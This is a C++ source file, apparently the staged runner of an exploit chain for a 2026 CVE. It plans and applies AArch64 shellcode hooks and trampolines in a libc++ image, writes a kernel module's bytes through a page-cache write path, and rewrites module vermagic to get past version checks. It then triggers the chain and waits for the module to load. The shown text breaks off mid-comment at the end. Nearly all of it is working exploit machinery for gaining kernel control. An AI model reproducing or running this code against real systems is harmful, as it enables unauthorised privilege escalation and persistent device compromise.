/* B5-9c staged execution entry -- implementation. See stage_runner.hpp. */

#include "backend/cve_2026_43284/stage_runner.hpp"

#include "backend/cve_2026_43284/lkm_window.hpp"
#include "backend/cve_2026_43284_state.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "plugin/loader.hpp"
#include "plugin/registry.hpp"
#include "plugin/sha256.hpp"
#include "support/run_state.hpp"

#include <array>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <limits>
#include <string>
#include <string_view>

#if defined(__linux__)
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::stage_runner {
    namespace {
        constexpr std::uint64_t kMinModuleBytes = 64U;
        constexpr std::uint64_t kMaxModuleBytes = std::uint64_t{64} * 1024U * 1024U;

        char bool_digit(bool value) noexcept { return value ? '1' : '0'; }

        void append_event(std::string &out, std::string_view step,
                          std::string_view status) {
            out += ghostlock::support::run_state::format_event(step, status);
        }

        void append_bool(std::string &out, bool value) { out.push_back(bool_digit(value)); }

        void emit(const std::string &text) {
            if (!text.empty()) {
                (void)std::fwrite(text.data(), 1U, text.size(), stdout);
                (void)std::fflush(stdout);
            }
        }

        /* Fills the run.target diagnostics from a plan: the span that the valid
         * regions cover and whether any of them asks for a pre-image check.
         * Malformed or overflowing regions are skipped here; the closure check
         * rejects the plan separately. */
        void fill_plan_diagnostics(const steps::PatchPlan &plan,
                                   StageReport &report) noexcept {
            if (plan.regions == nullptr) {
                return;
            }
            bool any = false;
            std::uint64_t min_offset = std::numeric_limits<std::uint64_t>::max();
            std::uint64_t max_end = 0U;
            for (std::size_t i = 0U; i < plan.region_count; ++i) {
                const steps::PatchRegion &region = plan.regions[i];
                if (region.bytes == nullptr || region.len == 0U ||
                    region.offset >
                            std::numeric_limits<std::uint64_t>::max() - region.len) {
                    continue;
                }
                const std::uint64_t end =
                        region.offset + static_cast<std::uint64_t>(region.len);
                if (region.offset < min_offset) {
                    min_offset = region.offset;
                }
                if (end > max_end) {
                    max_end = end;
                }
                any = true;
            }
            if (any) {
                report.plan_offset = min_offset;
                report.plan_len = max_end - min_offset;
            }
        }

        /* Maps a chain failure onto the staged vocabulary. TargetOutOfBounds and
         * PreImageMismatch are fail-closed pre-write assertions and stay
         * distinct from the generic write rejection. */
        [[nodiscard]] StageError stage_error_from_chain(steps::ChainError error,
                                                        bool wrote) noexcept {
            switch (error) {
                case steps::ChainError::None:
                    return wrote ? StageError::None : StageError::WriteRejected;
                case steps::ChainError::TargetOutOfBounds:
                    return StageError::TargetOutOfBounds;
                case steps::ChainError::PreImageMismatch:
                    return StageError::PreImageMismatch;
                default:
                    return StageError::WriteRejected;
            }
        }

#if defined(__linux__)
        /* Creates the connected ESP-in-UDP sender socket from the session SA:
         * bind 127.0.0.1:sender_port, connect 127.0.0.1:encap_port. Returns the
         * fd, or a negative -errno. */
        int connect_esp_socket(const IpsecSaParams &sa) noexcept {
            const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                return -errno;
            }
            int opt = 1;
            (void)::setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt,
                               static_cast<socklen_t>(sizeof(opt)));
            sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(sa.sender_port);
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::bind(fd, reinterpret_cast<sockaddr *>(&source),
                       static_cast<socklen_t>(sizeof(source))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            sockaddr_in destination{};
            destination.sin_family = AF_INET;
            destination.sin_port = htons(sa.encap_port);
            destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::connect(fd, reinterpret_cast<sockaddr *>(&destination),
                          static_cast<socklen_t>(sizeof(destination))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            return fd;
        }
#endif

        /* Conservative AArch64 PC-relative test for the displaced instruction.
         * The staged plan replays that word from the shellcode payload, so any
         * encoding whose result depends on its own PC cannot be relocated and
         * is rejected. The masks cover B/BL, B.cond, CBZ/CBNZ, TBZ/TBNZ,
         * ADR/ADRP and LDR-literal; over-rejection is the fail-closed
         * direction. */
        [[nodiscard]] constexpr bool is_pc_relative_instruction(
                std::uint32_t word) noexcept {
            if ((word & 0x7C000000U) == 0x14000000U) return true; /* B / BL */
            if ((word & 0xFF000010U) == 0x54000000U) return true; /* B.cond */
            if ((word & 0x7E000000U) == 0x34000000U) return true; /* CBZ/CBNZ */
            if ((word & 0x7E000000U) == 0x36000000U) return true; /* TBZ/TBNZ */
            if ((word & 0x1F000000U) == 0x10000000U) return true; /* ADR/ADRP */
            if ((word & 0x3B000000U) == 0x18000000U) return true; /* LDR literal */
            return false;
        }

        /* Appends 0x + lowercase hex, zero-padded to at least min_digits. */
        void append_hex(std::string &out, std::uint64_t value,
                        std::size_t min_digits) {
            static const char kDigits[] = "0123456789abcdef";
            char buf[16];
            std::size_t count = 0U;
            do {
                buf[count++] = kDigits[value & 0xFU];
                value >>= 4U;
            } while (value != 0U);
            out += "0x";
            for (std::size_t i = count; i < min_digits; ++i) {
                out.push_back('0');
            }
            while (count > 0U) {
                out.push_back(buf[--count]);
            }
        }

        /* Read surface over the already-loaded hook image: the plan path never
         * re-reads the file, and the write face refuses every call so a plan
         * run cannot write a byte. */
        struct PlanImageReadContext final {
            const std::uint8_t *data = nullptr;
            std::size_t size = 0U;
        };

        long plan_image_read16(void *raw, std::uint64_t offset,
                               std::uint8_t out[16]) noexcept {
            if (raw == nullptr || out == nullptr) {
                return -EINVAL;
            }
            const auto *ctx = static_cast<const PlanImageReadContext *>(raw);
            if (ctx->data == nullptr || offset > ctx->size ||
                ctx->size - static_cast<std::size_t>(offset) < 16U) {
                return -EIO;
            }
            std::memcpy(out, ctx->data + static_cast<std::size_t>(offset), 16U);
            return 16;
        }

        std::int32_t plan_write_refused(void *, std::uint64_t,
                                        const void *) noexcept {
            return -EROFS;
        }
    } // namespace

    std::string_view stage_name(Stage stage) noexcept {
        switch (stage) {
            case Stage::Plan: return "plan";
            case Stage::Write: return "write";
            case Stage::Trigger: return "trigger";
            case Stage::Full: return "full";
        }
        return "unknown";
    }

    bool parse_stage(std::string_view text, Stage &out) noexcept {
        if (text == "plan") {
            out = Stage::Plan;
        } else if (text == "write") {
            out = Stage::Write;
        } else if (text == "trigger") {
            out = Stage::Trigger;
        } else if (text == "full") {
            out = Stage::Full;
        } else {
            return false;
        }
        return true;
    }

    std::string_view stage_error_name(StageError error) noexcept {
        switch (error) {
            case StageError::None: return "None";
            case StageError::InvalidArgument: return "InvalidArgument";
            case StageError::ModuleReadFailed: return "ModuleReadFailed";
            case StageError::ModulePrecheckFailed: return "ModulePrecheckFailed";
            case StageError::PlanInvalid: return "PlanInvalid";
            case StageError::TargetOutOfBounds: return "TargetOutOfBounds";
            case StageError::PreImageMismatch: return "PreImageMismatch";
            case StageError::NotReady: return "NotReady";
            case StageError::SessionRejected: return "SessionRejected";
            case StageError::WriteRejected: return "WriteRejected";
            case StageError::TriggerRejected: return "TriggerRejected";
            case StageError::WaitRejected: return "WaitRejected";
            case StageError::KsudFailed: return "KsudFailed";
            case StageError::CleanupRejected: return "CleanupRejected";
            case StageError::HookReadFailed: return "HookReadFailed";
            case StageError::HookImageTooLarge: return "HookImageTooLarge";
            case StageError::HookPlanFailed: return "HookPlanFailed";
            case StageError::HookIoUnavailable: return "HookIoUnavailable";
            case StageError::PluginRejected: return "PluginRejected";
        }
        return "Unknown";
    }

    bool build_module_plan(std::string_view module_path, PlanBuffer &out,
                           StageError &error) {
        out = PlanBuffer{};
        error = StageError::None;
        if (module_path.empty()) {
            error = StageError::InvalidArgument;
            return false;
        }
        const std::string path(module_path);
        std::FILE *file = std::fopen(path.c_str(), "rb");
        if (file == nullptr) {
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_END) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const long size = std::ftell(file);
        if (size < 0 || static_cast<std::uint64_t>(size) < kMinModuleBytes ||
            static_cast<std::uint64_t>(size) > kMaxModuleBytes) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_SET) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const std::uint64_t module_bytes = static_cast<std::uint64_t>(size);
        const std::uint64_t padded = ((module_bytes + 15U) / 16U) * 16U;
        out.bytes.assign(static_cast<std::size_t>(padded), 0U);
        const std::size_t read =
                std::fread(out.bytes.data(), 1U, static_cast<std::size_t>(module_bytes),
                           file);
        (void)std::fclose(file);
        if (read != static_cast<std::size_t>(module_bytes)) {
            out = PlanBuffer{};
            error = StageError::ModuleReadFailed;
            return false;
        }
        out.module_bytes = module_bytes;
        out.blocks = static_cast<std::uint32_t>(padded / 16U);
        out.region.offset = 0U;
        out.region.bytes = out.bytes.data();
        out.region.len = static_cast<std::size_t>(padded);
        out.region.verify = true;
        out.region.rollback = true;
        out.region.label = "module";
        out.plan.regions = &out.region;
        out.plan.region_count = 1U;
        /* The plan declares its own extent so the closure assert can bound it
         * even before a carrier size is known. */
        out.plan.extent = padded;
        return true;
    }

    std::string_view hook_error_name(steps::HookPatchError error) noexcept {
        switch (error) {
            case steps::HookPatchError::None: return "None";
            case steps::HookPatchError::NullImage: return "NullImage";
            case steps::HookPatchError::ImageTooSmall: return "ImageTooSmall";
            case steps::HookPatchError::TargetNotFound: return "TargetNotFound";
            case steps::HookPatchError::GuardRejected: return "GuardRejected";
            case steps::HookPatchError::ShellcodeBuildFailed:
                return "ShellcodeBuildFailed";
            case steps::HookPatchError::ShellcodeBufferTooSmall:
                return "ShellcodeBufferTooSmall";
            case steps::HookPatchError::PlanFailed: return "PlanFailed";
            case steps::HookPatchError::IoUnavailable: return "IoUnavailable";
            case steps::HookPatchError::ReadFailed: return "ReadFailed";
            case steps::HookPatchError::WriteFailed: return "WriteFailed";
            case steps::HookPatchError::InvalidPlan: return "InvalidPlan";
            case steps::HookPatchError::NotApplied: return "NotApplied";
        }
        return "Unknown";
    }

    std::string_view hook_guard_name(steps::HookGuardPolicy guard) noexcept {
        return guard == steps::HookGuardPolicy::Reject ? "reject" : "skip";
    }

    bool plan_staged_hook(const StagedHookRequest &request,
                          StagedHookPlan &out) noexcept {
        out = StagedHookPlan{};
        out.attempted = true;
        out.target = request.hook_target;
        out.symbol = request.symbol;
        out.guard = request.guard;

        /* Default to the embedded upstream libcxx.S template, both when the
         * caller supplies no template and when the value slots must be bound
         * from the carrier path. */
        steps::ShellcodeTemplate default_template{};
        steps::ShellcodeBinding default_bindings[steps::kLibcxxValueSlotCount]{};
        std::size_t default_binding_count = 0U;
        const steps::ShellcodeTemplate *tmpl = request.tmpl;
        const steps::ShellcodeBinding *bindings = request.bindings;
        std::size_t binding_count = request.binding_count;
        std::size_t displaced_slot = request.displaced_slot;
        if (tmpl == nullptr) {
            steps::LibcxxHookBindings libcxx{};
            libcxx.carrier_path = request.carrier_path;
            steps::ShellcodeError binding_error = steps::ShellcodeError::None;
            if (!steps::make_libcxx_hook_bindings(libcxx, default_bindings,
                                                  default_binding_count,
                                                  binding_error)) {
                out.error = StageError::HookPlanFailed;
                out.hook_error = steps::HookPatchError::ShellcodeBuildFailed;
                return false;
            }
            default_template = steps::libcxx_shellcode_template();
            tmpl = &default_template;
            bindings = default_bindings;
            binding_count = default_binding_count;
            displaced_slot = steps::kLibcxxSlotDisplaced;
        }

        steps::HookPatchPlan plan{};
        steps::HookPatchError error = steps::HookPatchError::None;
        if (!steps::plan_hook_patch(
                    request.image, request.image_size, request.symbol, request.guard,
                    *tmpl, bindings, binding_count, displaced_slot,
                    request.shellcode_buf, request.shellcode_cap,
                    request.shellcode_orig_buf, request.io, plan, error)) {
            out.error = StageError::HookPlanFailed;
            out.hook_error = error;
            return false;
        }

        /* The displaced word is replayed from the payload; a PC-relative word
         * would execute against the wrong PC, so the staged plan fails closed
         * before any write path can be armed. */
        if (is_pc_relative_instruction(plan.hook.displaced_instruction)) {
            out.steal_unsafe = true;
            out.error = StageError::HookPlanFailed;
            out.hook_error = steps::HookPatchError::None;
            return false;
        }

        out.valid = true;
        out.error = StageError::None;
        out.hook_error = steps::HookPatchError::None;
        out.hook_file_offset = plan.hook.hook_file_offset;
        out.hook_vaddr = plan.hook.hook_vaddr;
        out.displaced_instruction = plan.hook.displaced_instruction;
        out.guard_instruction = plan.hook.guard_instruction;
        out.guard_skipped = plan.hook.guard_skipped;
        out.shellcode_file_offset = plan.hook.shellcode_file_offset;
        out.shellcode_vaddr = plan.hook.shellcode_vaddr;
        out.shellcode_len = plan.shellcode_size;
        out.payload_max = plan.hook.payload_max_bytes;
        out.trampoline_offset = plan.trampoline_offset;
        out.trampoline_pos = plan.trampoline_pos;
        out.trampoline_len = steps::kHookTrampolineBytes;
        return true;
    }

    bool read_hook_image(std::string_view path, std::size_t max_bytes,
                         std::vector<std::uint8_t> &out, StageError &error) {
        out.clear();
        error = StageError::None;
        if (path.empty() || max_bytes == 0U) {
            error = StageError::HookReadFailed;
            return false;
        }
        const std::string native_path(path);
        std::FILE *file = std::fopen(native_path.c_str(), "rb");
        if (file == nullptr) {
            error = StageError::HookReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_END) != 0) {
            (void)std::fclose(file);
            error = StageError::HookReadFailed;
            return false;
        }
        const long size = std::ftell(file);
        if (size <= 0 || static_cast<std::uint64_t>(size) > max_bytes) {
            (void)std::fclose(file);
            error = size <= 0 ? StageError::HookReadFailed
                              : StageError::HookImageTooLarge;
            return false;
        }
        if (std::fseek(file, 0, SEEK_SET) != 0) {
            (void)std::fclose(file);
            error = StageError::HookReadFailed;
            return false;
        }
        const std::size_t bytes = static_cast<std::size_t>(size);
        out.assign(bytes, 0U);
        const std::size_t read = std::fread(out.data(), 1U, bytes, file);
        (void)std::fclose(file);
        if (read != bytes) {
            out.clear();
            error = StageError::HookReadFailed;
            return false;
        }
        return true;
    }

    StagedHookAssets prepare_staged_hook(RealChainContext &ctx,
                                         std::string_view hook_target,
                                         std::string_view hook_symbol,
                                         steps::HookGuardPolicy guard,
                                         std::vector<std::uint8_t> &image,
                                         std::uint8_t *shellcode,
                                         std::size_t shellcode_cap,
                                         std::uint8_t *shellcode_orig,
                                         const steps::HookPatchIo &io) {
        StagedHookAssets out{};
        out.status = StagedHookStatus::ImageReadFailed;
        out.error = StageError::HookReadFailed;
        StageError image_error = StageError::None;
        if (!read_hook_image(hook_target, steps::kElfMaxImageBytes, image,
                             image_error)) {
            out.status = image_error == StageError::HookImageTooLarge
                                 ? StagedHookStatus::ImageTooLarge
                                 : StagedHookStatus::ImageReadFailed;
            out.error = image_error;
            return out;
        }
        /* A read image with no page-cache write face is not an error path the
         * chain can fix: leave the context unarmed and report it. */
        if (shellcode == nullptr || shellcode_orig == nullptr ||
            shellcode_cap == 0U || !io.available()) {
            out.status = StagedHookStatus::IoUnavailable;
            out.error = StageError::HookIoUnavailable;
            return out;
        }
        ctx.libcxx_image = image.data();
        ctx.libcxx_image_size = image.size();
        ctx.hook_symbol = hook_symbol;
        ctx.hook_guard = guard;
        ctx.hook_shellcode = shellcode;
        ctx.hook_shellcode_cap = shellcode_cap;
        ctx.hook_shellcode_orig = shellcode_orig;
        ctx.hook_io = io;
        out.status = StagedHookStatus::Armed;
        out.error = StageError::None;
        return out;
    }

    bool precheck_staged_module(std::string_view module_path,
                                const lkm::DeviceKernelFacts &required,
                                lkm::ModuleFacts &facts,
                                lkm::LkmImageError &error) noexcept {
        facts = lkm::ModuleFacts{};
        error = lkm::LkmImageError::None;
        if (module_path.empty()) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        return lkm::precheck_module_file(module_path, required, facts, error);
    }

    bool reconcile_module_vermagic(std::uint8_t *image, std::size_t image_size,
                                   const lkm::DeviceKernelFacts &required,
                                   bool allow_rewrite, lkm::ModuleFacts &facts,
                                   lkm::VermagicOutcome &outcome,
                                   lkm::LkmImageError &error) noexcept {
        facts = lkm::ModuleFacts{};
        outcome = lkm::VermagicOutcome::Unchecked;
        error = lkm::LkmImageError::None;
        if (image == nullptr) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        lkm::ModuleFacts observed{};
        if (lkm::precheck_module_bytes(image, image_size, required, observed, error)) {
            facts = observed;
            outcome = lkm::VermagicOutcome::Original;
            return true;
        }
        /* Only a pure vermagic mismatch is rewritable; every other precheck
         * failure (bad ELF, signature, ...) stays fatal exactly as before. */
        if (error != lkm::LkmImageError::VermagicMismatch || !observed.has_vermagic) {
            return false;
        }
        /* The rewrite fills the required VERMAGIC_STRING. That reconciles only a
         * differing option tail; a release-token-only difference is not the
         * rewrite's job and is refused even when the policy allows it. */
        if (!allow_rewrite ||
            observed.vermagic_diff != lkm::VermagicDiffReason::Options) {
            facts = observed;
            outcome = lkm::VermagicOutcome::Required;
            return false;
        }
        char required_text[lkm::kVermagicMaxBytes] = {};
        std::size_t required_len = 0U;
        if (!lkm::required_vermagic(required, required_text, sizeof(required_text),
                                    required_len)) {
            facts = observed;
            error = lkm::LkmImageError::VermagicMissing;
            return false;
        }
        if (!lkm::rewrite_vermagic(image, image_size,
                                   std::string_view(required_text, required_len), error)) {
            facts = observed;
            return false;
        }
        lkm::ModuleFacts rewritten{};
        if (!lkm::precheck_module_bytes(image, image_size, required, rewritten, error)) {
            facts = rewritten;
            return false;
        }
        rewritten.vermagic_rewritten = true;
        facts = rewritten;
        outcome = lkm::VermagicOutcome::Rewritten;
        return true;
    }

    StageReport run_stage(Stage stage, const steps::ChainRequest &request,
                          const steps::ChainOps &ops,
                          steps::ChainWorkspace &workspace) noexcept {
        StageReport report{};
        report.stage = stage;
        report.dev_target = request.allow_dev_carrier_path;
        report.target_size = request.target_size;
        fill_plan_diagnostics(request.plan, report);

        /* Static plan closure (structure, declared extent, target-file size and
         * mutual overlap) is asserted before any op is bound, for every stage
         * including plan. run_chain() re-checks it before writing. */
        const steps::ChainError closure =
                steps::validate_plan_closure(request.plan, 0U, request.target_size);
        if (closure != steps::ChainError::None) {
            report.error = closure == steps::ChainError::TargetOutOfBounds
                                   ? StageError::TargetOutOfBounds
                                   : StageError::PlanInvalid;
            return report;
        }
        if (stage == Stage::Plan) {
            return report;
        }

        steps::ChainRequest local = request;
        local.stop_after = stage == Stage::Write ? steps::ChainStopAfter::Write
                                                 : steps::ChainStopAfter::Full;
        report.chain = steps::run_chain(local, ops, workspace);
        report.wrote = report.chain.blocks_written != 0U;
        report.verified = report.wrote &&
                          report.chain.blocks_verified == report.chain.blocks_written;
        report.triggered = (stage == Stage::Trigger || stage == Stage::Full) &&
                           report.wrote &&
                           report.chain.error != steps::ChainError::TriggerFailed;
        report.terminus = report.chain.lkm_loaded;
        report.wait_incomplete =
                report.chain.error == steps::ChainError::WaitTimeout ||
                report.chain.error == steps::ChainError::LkmFailed;
        report.preimage_ok = report.chain.preimage_checked;

        switch (stage) {
            case Stage::Plan:
                break;
            case Stage::Write:
                report.error = stage_error_from_chain(report.chain.error,
                                                      report.wrote);
                break;
            case Stage::Trigger:
            case Stage::Full:
                /* Upstream nativeRunAll rc semantics: a verified patch plus a
                 * fired sentry is not enough; the terminus outcome decides.
                 * Success 0, ksud marker failure 1, timeout 2, everything else
                 * (patch/write/trigger) 3. Trigger and full share the rule. */
                if (report.chain.error == steps::ChainError::None &&
                    report.terminus) {
                    report.error = StageError::None;
                } else if (report.chain.error == steps::ChainError::LkmFailed) {
                    report.error = StageError::KsudFailed;
                } else if (report.chain.error == steps::ChainError::WaitTimeout) {
                    report.error = StageError::WaitRejected;
                } else if (report.chain.error == steps::ChainError::TriggerFailed) {
                    report.error = StageError::TriggerRejected;
                } else if (report.chain.error ==
                           steps::ChainError::TargetOutOfBounds) {
                    report.error = StageError::TargetOutOfBounds;
                } else if (report.chain.error == steps::ChainError::PreImageMismatch) {
                    report.error = StageError::PreImageMismatch;
                } else {
                    report.error = StageError::WriteRejected;
                }
                break;
        }
        if (report.error == StageError::None && !report.chain.cleanup_ran) {
            report.error = StageError::CleanupRejected;
        }
        return report;
    }

    std::string format_stage_report(const StageReport &report,
                                    std::string_view module_path,
                                    std::string_view target_path,
                                    std::uint64_t module_bytes) {
        std::string out;
        out.reserve(1024U);

        {
            std::string status("stage=");
            status += stage_name(report.stage);
            append_event(out, "run.cve_2026_43284", status);
        }
        {
            std::string status("path=");
            status += module_path.empty() ? std::string_view("-") : module_path;
            status += " bytes=";
            status += std::to_string(module_bytes);
            status += " wrote=";
            append_bool(status, report.wrote);
            status += " verified=";
            append_bool(status, report.verified);
            status += " ko_vermagic=";
            status += lkm::vermagic_outcome_name(report.vermagic);
            append_event(out, "run.module", status);
        }
        {
            /* Write-location diagnostics: the target size the boundary assert
             * used, the plan span and whether a declared pre-image was
             * verified against the target. */
            std::string status("path=");
            status += target_path.empty() ? std::string_view("-") : target_path;
            status += " size=";
            status += std::to_string(report.target_size);
            status += " offset=";
            status += std::to_string(report.plan_offset);
            status += " len=";
            status += std::to_string(report.plan_len);
            status += " preimage=";
            status += report.preimage_ok ? "ok" : "absent";
            append_event(out, "run.target", status);
        }
        if (report.hook.attempted) {
            /* Read-only hook-plan diagnostics (B5-9h-1): the site, the stolen
             * word, the shellcode/trampoline geometry and the fail-closed
             * outcome. hook_steal is the displaced instruction word. */
            const StagedHookPlan &hook = report.hook;
            std::string status("hook_target=");
            status += hook.target.empty() ? std::string_view("-") : hook.target;
            status += " hook_symbol=";
            status += hook.symbol.empty() ? std::string_view("-") : hook.symbol;
            status += " hook_guard=";
            status += hook_guard_name(hook.guard);
            status += " hook_vma=";
            append_hex(status, hook.hook_vaddr, 1U);
            status += " hook_offset=";
            append_hex(status, hook.hook_file_offset, 1U);
            status += " hook_steal=";
            append_hex(status, hook.displaced_instruction, 8U);
            status += " guard_inst=";
            append_hex(status, hook.guard_instruction, 8U);
            status += " guard_skipped=";
            append_bool(status, hook.guard_skipped);
            status += " shellcode_len=";
            status += std::to_string(hook.shellcode_len);
            status += " shellcode_vma=";
            append_hex(status, hook.shellcode_vaddr, 1U);
            status += " shellcode_offset=";
            append_hex(status, hook.shellcode_file_offset, 1U);
            status += " payload_max=";
            status += std::to_string(hook.payload_max);
            status += " trampoline_len=";
            status += std::to_string(hook.trampoline_len);
            status += " trampoline_offset=";
            append_hex(status, hook.trampoline_offset, 1U);
            status += " trampoline_pos=";
            status += std::to_string(hook.trampoline_pos);
            status += " hook_error=";
            status += hook.steal_unsafe
                              ? std::string_view("StealUnsafe")
                              : hook_error_name(hook.hook_error);
            append_event(out, "run.hook", status);
        }
        {
            /* Explicit misuse guard: the dev-only non-vendor carrier hatch is
             * always visible in the records. */
            append_event(out, "run.dev_target",
                         report.dev_target ? "allow=1" : "allow=0");
        }
        if (report.stage != Stage::Plan) {
            const steps::ChainResult &chain = report.chain;
            std::string status("written=");
            status += std::to_string(chain.blocks_written);
            status += " verified=";
            status += std::to_string(chain.blocks_verified);
            status += " rolled_back=";
            status += std::to_string(chain.blocks_rolled_back);
            status += " cleanup=";
            append_bool(status, chain.cleanup_ran);
            status += " journal_overflow=";
            append_bool(status, chain.journal_overflow);
            status += " rollback_incomplete=";
            append_bool(status, chain.rollback_incomplete);
            status += " crash_dump=";
            append_bool(status, chain.crash_dump_patched);
            /* B5-9h-4 hook application: planned/armed describe the assets the
             * runner prepared, hook is the chain's applied flag and hook_error
             * names the first reason the hook was not armed/applied. */
            status += " hook_planned=";
            append_bool(status, report.hook_planned);
            status += " hook_armed=";
            append_bool(status, report.hook_armed);
            status += " hook=";
            append_bool(status, chain.hook_applied);
            status += " hook_restored=";
            append_bool(status, chain.hook_restored);
            status += " hook_error=";
            status += stage_error_name(report.hook_error);
            append_event(out, "run.chain", status);

            if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
                std::string trigger("fired=");
                append_bool(trigger, report.triggered);
                trigger += " wait_incomplete=";
                append_bool(trigger, report.wait_incomplete);
                append_event(out, "run.trigger", trigger);

                std::string wait("outcome=");
                wait += chain_wait_name(chain.wait);
                wait += " terminus=";
                append_bool(wait, report.terminus);
                wait += " error=";
                wait += chain_error_name(chain.error);
                append_event(out, "run.wait", wait);
            }
        }
        {
            std::string status;
            if (report.error == StageError::None) {
                status = "ok error=None";
            } else {
                status = "failed error=";
                status += stage_error_name(report.error);
            }
            append_event(out, "run.cve_2026_43284", status);
        }
        return out;
    }

    int stage_exit_code(const StageReport &report) noexcept {
        /* trigger/full: upstream nativeRunAll rc (0 ok / 1 ksud failed /
         * 2 timeout / 3 patch). */
        if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
            switch (report.error) {
                case StageError::None: return 0;
                case StageError::KsudFailed: return 1;
                case StageError::WaitRejected: return 2;
                default: return 3;
            }
        }
        switch (report.error) {
            case StageError::None: return 0;
            case StageError::WriteRejected: return 3;
            case StageError::TriggerRejected: return 4;
            case StageError::WaitRejected: return 5;
            case StageError::CleanupRejected: return 6;
            case StageError::InvalidArgument:
            case StageError::ModuleReadFailed:
            case StageError::ModulePrecheckFailed:
            case StageError::PlanInvalid:
            case StageError::TargetOutOfBounds:
            case StageError::PreImageMismatch:
            case StageError::NotReady:
            case StageError::SessionRejected:
            case StageError::KsudFailed:
            case StageError::HookReadFailed:
            case StageError::HookImageTooLarge:
            case StageError::HookPlanFailed:
            case StageError::HookIoUnavailable:
            case StageError::PluginRejected:
                return 2;
        }
        return 2;
    }

#if defined(__linux__)
    /* Capabilities the LKM window provides to a plugin: KernelMemory
     * read/write (LkmProxy) and KernelAlias. A module requiring anything else
     * is rejected at registration (fail-closed). */
    inline constexpr contract::Capability kLkmWindowCaps =
            contract::Capability::KernelRead |
            contract::Capability::KernelWrite | contract::Capability::Alias;

    namespace {
        /* delta-4 dev/gate-only plugin attachment. Owns the dlopen handle, the
         * registry and the borrowed module metadata. Declared before the window
         * runtime so it outlives every hook call. */
        struct PluginAttachment final {
            plugin::LoadResult load{};
            plugin::RuntimeRegistry registry{};
            bool loaded = false;
        };

        /* Loads one countermeasure .so through the ordinary fail-closed
         * plugin/loader and registers it. The whitelist root is the plugin's own
         * directory and the expected digest is computed from the file itself:
         * this flag is an explicit dev/gate escape hatch, not a production
         * trust path (production modules are profile-selected and
         * hash-pinned). */
        [[nodiscard]] bool load_gate_plugin(std::string_view path,
                                            PluginAttachment &out,
                                            std::string &reason) {
            const std::string plugin_path(path);
            const std::size_t slash = plugin_path.find_last_of('/');
            std::string dir = ".";
            if (slash != std::string::npos) {
                dir = slash == 0U ? std::string("/")
                                  : plugin_path.substr(0U, slash);
            }
            plugin::Loader loader(dir);
            char digest[plugin::kSha256HexLength + 1U] = {};
            if (plugin::sha256_file(plugin_path.c_str(), digest,
                                    sizeof(digest)) != 0) {
                reason = "plugin sha256 unavailable";
                return false;
            }
            out.load = loader.load(plugin_path.c_str(), digest, kLkmWindowCaps,
                                   contract::kHostImplementedTriggers);
            if (out.load.status != plugin::LoadStatus::Ok) {
                reason = plugin::load_status_name(out.load.status);
                return false;
            }
            plugin::ExternalModuleBinding binding{};
            binding.name = out.load.module_name.c_str();
            binding.version = out.load.module_version.c_str();
            binding.required_caps = out.load.required_caps;
            binding.hooks = out.load.hooks;
            binding.hook_count = out.load.hook_count;
            out.registry.reset(kLkmWindowCaps, contract::kHostImplementedTriggers);
            if (!out.registry.register_module(binding)) {
                reason = "plugin registration rejected";
                return false;
            }
            out.loaded = true;
            return true;
        }
    } // namespace
#endif

    int run_stage_cli(const StagedRunOptions &options) {
        const std::string_view module_path = options.module_path;
        const std::string_view target_path = options.target_path;
        const Stage stage = options.stage;
        const bool allow_dev_target = options.allow_dev_target;
        if (module_path.empty() || target_path.empty()) {
            return 1;
        }
        /* delta-4 dev/gate-only --plugin: load/register before touching the
         * device so a rejected module fails fast and the window never opens.
         * Only the device (Linux) staged path has an LKM window to attach to;
         * the non-Linux host runner never reaches the window anyway. */
#if defined(__linux__)
        PluginAttachment plugin_attachment{};
        if (!options.plugin_path.empty()) {
            std::string plugin_reason;
            if (!load_gate_plugin(options.plugin_path, plugin_attachment,
                                  plugin_reason)) {
                StageReport report{};
                report.stage = stage;
                report.dev_target = allow_dev_target;
                report.error = StageError::PluginRejected;
                emit(format_stage_report(report, module_path, target_path, 0U));
                return stage_exit_code(report);
            }
        }
#endif
        /* The carrier is separate from the patch #1 target: it defaults to the
         * positional target so the pre-B5-9h-1 invocation is unchanged. */
        const std::string carrier_path = options.carrier_path.empty()
                                                 ? std::string(target_path)
                                                 : std::string(options.carrier_path);
        const std::string hook_target(options.hook_target);
        const std::string hook_symbol(options.hook_symbol);
        const std::string patch1_target(options.patch1_target);

        PlanBuffer plan{};
        StageError plan_error = StageError::None;
        if (!build_module_plan(module_path, plan, plan_error)) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = plan_error;
            emit(format_stage_report(report, module_path, target_path, 0U));
            return stage_exit_code(report);
        }

        steps::CarrierTarget carrier{};
        carrier.path = carrier_path;
        carrier.size = 0U;
        steps::ChainRequest request{};
        request.carriers = &carrier;
        request.carrier_count = 1U;
        request.plan = plan.plan;
        /* S4 R4: single authority for the staged/dev wait budget (the
         * production path reads it from the document). */
        request.wait_timeout_ms = ghostlock::backend::kCve2026_43284WaitTimeoutDefaultMs;
        request.allow_dev_carrier_path = allow_dev_target;

        if (stage == Stage::Plan) {
            /* Read-only: the module/carrier plan is validated and the libc++
             * hook plan is computed over an in-memory image. No device op is
